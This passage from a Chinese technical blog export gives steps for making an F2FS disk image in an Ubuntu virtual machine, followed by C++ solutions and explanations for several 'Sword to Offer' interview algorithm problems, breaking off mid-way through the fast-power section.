<li><code>sudo fdisk -l</code>查看磁盘信息可以找到刚添加的磁盘<br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103329865-51741236.png" alt="img"></li>
<li>所以新磁盘是/dev/sdb</li>
</ol>
<h2 id="安装F2FS工具"><a href="#安装F2FS工具" class="headerlink" title="安装F2FS工具"></a>安装F2FS工具</h2><p><a href="https://blog.csdn.net/sweeneil/article/details/91897016">参考</a><br><code>sudo apt install f2fs-tools</code></p>
<h2 id="格式化并挂载磁盘"><a href="#格式化并挂载磁盘" class="headerlink" title="格式化并挂载磁盘"></a>格式化并挂载磁盘</h2><ol>
<li>先<code>sudo su</code>进入root</li>
<li>然后<code>mkfs.f2fs -l f2fs /dev/sdb -f</code>即可将设备格式化为F2FS</li>
<li><code>mount -t f2fs /dev/sdb /mnt/f2fs</code>挂载磁盘到目录/mnt/f2fs，到此就可以使用sdb设备</li>
<li>重启后，即可看到挂载成功</li>
</ol>
<h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dd if=/dev/sdb of=/home/username/Desktop/f2fs.img</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>如果对文件系统有改动，在导出镜像时，最好先用<code>umount /dev/sdb</code>解除挂载后，再重新挂载，然后生成img。</p>
<h2 id="如何以root用户登录ubuntu"><a href="#如何以root用户登录ubuntu" class="headerlink" title="如何以root用户登录ubuntu"></a>如何以root用户登录ubuntu</h2><p><a href="https://www.cnblogs.com/atoman/p/13537856.html">参考</a></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>F2FS</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指Offer打卡</title>
    <url>/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/</url>
    <content><![CDATA[<p>剑指Offer第二版<br><a href="https://www.acwing.com/problem/search/1/?csrfmiddlewaretoken=Y5IpedXu3Sl5DfZekji1hxNwdx39jFGAZnymRUdbGvocdSTYVoacOQ44UmneUfw4&amp;search_content=%E5%89%91%E6%8C%87">https://www.acwing.com/problem/search/1/?csrfmiddlewaretoken=Y5IpedXu3Sl5DfZekji1hxNwdx39jFGAZnymRUdbGvocdSTYVoacOQ44UmneUfw4&amp;search_content=%E5%89%91%E6%8C%87</a></p>
<h2 id="Group1"><a href="#Group1" class="headerlink" title="Group1"></a>Group1</h2><h3 id="数组中重复的数字"><a href="#数组中重复的数字" class="headerlink" title="数组中重复的数字"></a>数组中重复的数字</h3><p><a href="https://www.acwing.com/problem/content/14/">https://www.acwing.com/problem/content/14/</a></p>
<ol>
<li>先遍历数组，若有超过区间 [0, n-1] 的数值，就直接返回 -1</li>
<li>再遍历一次数组，如果当前位置的数值与下标不一样。<ul>
<li>且数值对应的那个下标与当前位置的值不同，就交换它们的位置。</li>
<li>若一样，则说明找到了重复元素了</li>
</ul>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x : nums) </span><br><span class="line">            <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != nums[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] != nums[nums[i]]) <span class="built_in">swap</span>(nums[i], nums[nums[i]]);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="不修改数组找出重复的数字"><a href="#不修改数组找出重复的数字" class="headerlink" title="不修改数组找出重复的数字"></a>不修改数组找出重复的数字</h3><p><a href="https://www.acwing.com/problem/content/15/">https://www.acwing.com/problem/content/15/</a></p>
<ul>
<li><strong>抽屉原理</strong>：将 n+1 个苹果放进 n 个抽屉，必然会有两个苹果在一个抽屉的情况    </li>
</ul>
<p>分治（<strong>二分</strong>）的思想，根据数值大小（注意不是下标）将整个区间一分为二。  </p>
<ul>
<li>因为数值范围是 [1, n]，所以假设总共有 n 个坑位。也就是说  </li>
</ul>
<script type="math/tex; mode=display">左区间大小+右区间大小=n</script><ul>
<li>又因为共有 n+1 个数，所以，起码会有一边数的个数会大于坑位的个数。</li>
<li>不断找到这个区间并再次划分左右，直到区间内只存在一个数，这个数就一定是重复数字</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">duplicateInArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">1</span>, r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l + ((r-l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i : nums) s += i &gt;= l &amp;&amp; i &lt;= mid;  <span class="comment">// 这里的s用来累计需要放在左区间中的数值个数的，如果nums中某数在[l,mid]就确定在左区间，s就加1</span></span><br><span class="line">            <span class="keyword">if</span> (s &gt; mid - l + <span class="number">1</span>) r = mid;  <span class="comment">// 左区间内数值个数大于左区间坑位则将右边界左移到mid</span></span><br><span class="line">            <span class="keyword">else</span> l = mid + <span class="number">1</span>;  <span class="comment">// 说明右区间数值个数大于坑位，左边界右移到mid+1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="二维数组中的查找"><a href="#二维数组中的查找" class="headerlink" title="二维数组中的查找"></a>二维数组中的查找</h3><p><a href="https://www.acwing.com/problem/content/16/">https://www.acwing.com/problem/content/16/</a></p>
<p>这里可以看出，第 0 行的最后一列是该行最大，该列最小。所以从矩阵的右上角开始遍历。</p>
<ul>
<li>正好等于目标值直接返回 true</li>
<li>大于目标值，说明目标一定在更小的列</li>
<li>小于目标值，则一定在更大的行</li>
</ul>
<p><img src="/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/image-20210705225035681.png" alt="image-20210705225035681" style="zoom:80%;"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">findNumberIn2DArray</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix.<span class="built_in">size</span>() == <span class="number">0</span> || matrix[<span class="number">0</span>].<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 检查边界</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = matrix[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; matrix.<span class="built_in">size</span>() &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (matrix[i][j] &gt; target) --j;</span><br><span class="line">            <span class="keyword">else</span> ++i; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="替换空格"><a href="#替换空格" class="headerlink" title="替换空格"></a>替换空格</h3><p><a href="https://www.acwing.com/problem/content/17/">https://www.acwing.com/problem/content/17/</a></p>
<p><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof">https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof</a></p>
<ul>
<li>很简单，开一个新字符串，再遍历源字符串，遇到空格就加 <code>%20</code>，否则就加原字符</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">replaceSpace</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i : s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="string">&#x27; &#x27;</span>) </span><br><span class="line">                ans += <span class="string">&quot;%20&quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="从尾到头打印链表"><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h3><p><a href="https://www.acwing.com/problem/content/18/">https://www.acwing.com/problem/content/18/</a></p>
<p><a href="https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/">https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/</a></p>
<ul>
<li>创建数组，遍历链表，依次将值压入数组</li>
<li>逆序返回</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">reversePrint</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (head) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;(res.<span class="built_in">rbegin</span>(), res.<span class="built_in">rend</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a>重建二叉树</h3><p><a href="https://www.acwing.com/problem/content/23/">https://www.acwing.com/problem/content/23/</a></p>
<p><a href="https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/">https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/</a></p>
<ul>
<li>先用哈希表记录中序遍历每个值的位置，以便于后面找根节点位置</li>
<li>搜索过程中<ul>
<li>先判断序列长度，如果序列为空就返回空指针</li>
<li>然后前序遍历的左边界值 <code>preorder[pl]</code> 一定是根节点，根据这个值在哈希表中找到中序遍历的位置</li>
<li>分别递归求出<strong>下一个</strong>左子树及右子树，然后插到 root 上就可以恢复二叉树了</li>
</ul>
</li>
</ul>
<p>其中 dfs 的几个参数前两个分别为前序遍历的左右边界，后两个分别是中序遍历的左右边界。求下一个左右子树时，区间范围的确定可以参考下图</p>
<p><img src="/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/image-20210706212029101.png" alt="image-20210706212029101" style="zoom: 67%;"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; hash;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; preorder, inorder;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; _preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; _inorder)</span> </span>&#123;</span><br><span class="line">        preorder = _preorder;</span><br><span class="line">        inorder = _inorder;</span><br><span class="line">        <span class="comment">// 用 hash 表记录根节点在中序数组中的位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inorder.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            hash[inorder[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(<span class="number">0</span>, preorder.<span class="built_in">size</span>()<span class="number">-1</span>, <span class="number">0</span>, inorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pl, <span class="keyword">int</span> pr, <span class="keyword">int</span> il, <span class="keyword">int</span> ir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pl &gt; pr) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">auto</span> root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(preorder[pl]);  <span class="comment">// 根节点就是前序遍历的第一个节点</span></span><br><span class="line">        <span class="keyword">int</span> k = hash[root-&gt;val]; <span class="comment">// 在中序遍历的位置为 k</span></span><br><span class="line">        <span class="keyword">auto</span> left = <span class="built_in">dfs</span>(pl+<span class="number">1</span>, pl+k-il,il,k<span class="number">-1</span>);  <span class="comment">// 左子树区间</span></span><br><span class="line">        <span class="keyword">auto</span> right = <span class="built_in">dfs</span>(pl+k-il+<span class="number">1</span>, pr, k+<span class="number">1</span>, ir); <span class="comment">// 右子树区间</span></span><br><span class="line">        root-&gt;left = left, root-&gt;right = right;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树的下一个节点"><a href="#二叉树的下一个节点" class="headerlink" title="二叉树的下一个节点"></a>二叉树的下一个节点</h3><p><a href="https://www.acwing.com/problem/content/31/">https://www.acwing.com/problem/content/31/</a></p>
<ul>
<li>情况一：如果某节点有右子树，那么右子树的最左侧节点就是后继</li>
<li>情况二：没有右子树。<ul>
<li>该节点是其父亲的右儿子：一直往上找父亲，直到父亲为 NULL</li>
<li>该节点是父亲的左儿子：其父亲就是后继（因为中序）</li>
</ul>
</li>
</ul>
<p><img src="/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/4ff4e3a3a28869c6.png" alt="4ff4e3a3a28869c6" style="zoom: 50%;"></p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode *father;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL), father(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">inorderSuccessor</span><span class="params">(TreeNode* p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;right) &#123;</span><br><span class="line">            p = p-&gt;right;</span><br><span class="line">            <span class="keyword">while</span> (p-&gt;left) p = p-&gt;left;</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (p-&gt;father &amp;&amp; p == p-&gt;father-&gt;right) p=p-&gt;father;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;father;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Group2"><a href="#Group2" class="headerlink" title="Group2"></a>Group2</h2><h3 id="机器人的运动范围"><a href="#机器人的运动范围" class="headerlink" title="机器人的运动范围"></a>机器人的运动范围</h3><p><a href="https://www.acwing.com/problem/content/22/">https://www.acwing.com/problem/content/22/</a></p>
<p><a href="https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/">https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/</a></p>
<ul>
<li>BFS<ul>
<li>将 <code>&#123;0,0&#125;</code> 压入队列，如果坐标各位之和满足要求，且没有被遍历过则结果 res 加 1</li>
<li>后面的 for 循环用于对坐标的移动，因为从最左上角开始，所以横纵坐标只需要朝着右下移动即可。所以 dx 和 dy 只需要两个维度，遍历到的坐标都压入队列中。</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 计算一个数字的各位之和</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get_single_sum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x) s += x%<span class="number">10</span>, x/=<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算坐标数位之和</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">get_single_sum</span>(p.first) + <span class="built_in">get_single_sum</span>(p.second);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意参数顺序，acwing 和 leetcode 参数顺序不同</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">movingCount</span><span class="params">(<span class="keyword">int</span> threshold, <span class="keyword">int</span> rows, <span class="keyword">int</span> cols)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!rows || !cols) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 行列为0就返回0</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">st</span>(rows, vector&lt;<span class="keyword">bool</span>&gt;(cols));  <span class="comment">// 判断某个格子是否已经走过</span></span><br><span class="line">        queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; q; <span class="comment">// 记录坐标</span></span><br><span class="line">        q.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">0</span>&#125;); </span><br><span class="line">        <span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">// 如果大于阈值或者已经走过，就 continue</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">get_sum</span>(t) &gt; threshold || st[t.first][t.second]) <span class="keyword">continue</span>;</span><br><span class="line">            res++;</span><br><span class="line">            st[t.first][t.second] = <span class="literal">true</span>; <span class="comment">// 标记一下，走过了</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 因为从 0,0 开始，所以需要扩展移动，可能向上下左右移动</span></span><br><span class="line">            <span class="comment">// 可以定义两个一维数组，表示向量，以对应横纵坐标，dx和dy分别表示横纵坐标</span></span><br><span class="line">            <span class="comment">// &#123;右,下&#125;</span></span><br><span class="line">            <span class="keyword">int</span>  dx[<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>&#125; , dy[<span class="number">2</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> x = t.first + dx[i], y = t.second + dy[i];</span><br><span class="line">                <span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; rows &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; cols) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;x,y&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="剪绳子"><a href="#剪绳子" class="headerlink" title="剪绳子"></a>剪绳子</h3><p><a href="https://www.acwing.com/problem/content/24/">https://www.acwing.com/problem/content/24/</a></p>
<p><a href="https://leetcode-cn.com/problems/jian-sheng-zi-lcof/">https://leetcode-cn.com/problems/jian-sheng-zi-lcof/</a></p>
<p>我们假设 $N&gt;0$，可以将 $N$ 分隔成若干份，有 $N=n_1+n_2+n_3+…+n_k$  </p>
<ol>
<li><p>假设存在其中一个数值 $n_i&gt;=5$，但是如果我们从这个数值中分出一个 3 来，再构造乘积，其结果一定是大于等于 $n_i$ 的，也即有 $3\times(n_i-3)\geq n_i$。证明如下：  </p>
<p>由上式可得 $3\times n_i-9\geq n_i$  </p>
<p>则 $n_i\geq 4.5$ 这是满足假设条件的，所以 $3\times(n_i-3)\geq n_i$ 一定成立，因此分割后的值一定不会存在大于等于 5 的情况</p>
</li>
<li><p>假设存在一个数值等于 4，而 4 可以分为 $2\times2$，没有影响，所以也可以不存在 4</p>
</li>
<li>假设存在三个 2，也即 $2\times2\times2$，但是这个被分割的值原本为 6，可以分成 $3\times3$ 显然比分成三个 2 要大。</li>
</ol>
<p>所以，综上，数值最终由 2 和 3 组成，2 的个数不超过 3 个。如果 2 的个数为 2，实际上就对应假设二，这个时候将结果乘以 4 并将值减去 4，就排除了这种情况，剩下只有一个 2 和若干 3 的情况。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cuttingRope</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) res *= <span class="number">4</span>, n-=<span class="number">4</span>;  <span class="comment">// 两个 2 的情况</span></span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">2</span>) res *= <span class="number">2</span>, n-=<span class="number">2</span>;  <span class="comment">// 一个 2 的情况</span></span><br><span class="line">        <span class="keyword">while</span> (n) res *= <span class="number">3</span>, n-=<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="二进制中-1-的个数"><a href="#二进制中-1-的个数" class="headerlink" title="二进制中 1 的个数"></a>二进制中 1 的个数</h3><p><a href="https://www.acwing.com/problem/content/25/">https://www.acwing.com/problem/content/25/</a></p>
<p><a href="https://leetcode-cn.com/problems/er-jin-zhi-zhong-1de-ge-shu-lcof/">https://leetcode-cn.com/problems/er-jin-zhi-zhong-1de-ge-shu-lcof/</a></p>
<p>这里需要对无符号数进行移位，否则，右移会补符号位。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="keyword">int</span> _n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> n = _n;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>) ans += <span class="number">1</span>;</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="数值的整数次方"><a href="#数值的整数次方" class="headerlink" title="数值的整数次方"></a>数值的整数次方</h3><p><a href="https://www.acwing.com/problem/content/26/">https://www.acwing.com/problem/content/26/</a></p>
<p><a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/</a></p>
<h4 id="常规做法（超时）"><a href="#常规做法（超时）" class="headerlink" title="常规做法（超时）"></a>常规做法（超时）</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Power</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">abs</span>(n); ++i) res *= x;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>) res = <span class="number">1</span>/res;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="快速幂-参考"><a href="#快速幂-参考" class="headerlink" title="快速幂 参考"></a>快速幂 <a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/solution/mian-shi-ti-16-shu-zhi-de-zheng-shu-ci-fang-kuai-s/">参考</a></h4><p>思想是二分。推导过程如下：  </p>
<ul>
<li><p>$x^{n}=x^{\frac{n}{2}}\times x^{\frac{n}{2}}=(x^2)^{\frac{n}{2}}$</p>
<ul>
<li>当 $n$ 为偶数：$x^n=(x^2)^{n//2}$ (<code>//</code>为整除)  </li>
<li>当 $n$ 为奇数：$x^n=x\times (x^2)^{n//2}$ 会多出一个 $x$  </li>
</ul>
</li>
<li><p>循环执行 $x=x^2$ 的赋值操作，将幂从 $n$ 将为 $\frac{n}{2}$ 直至 0</p>
</li>
</ul>
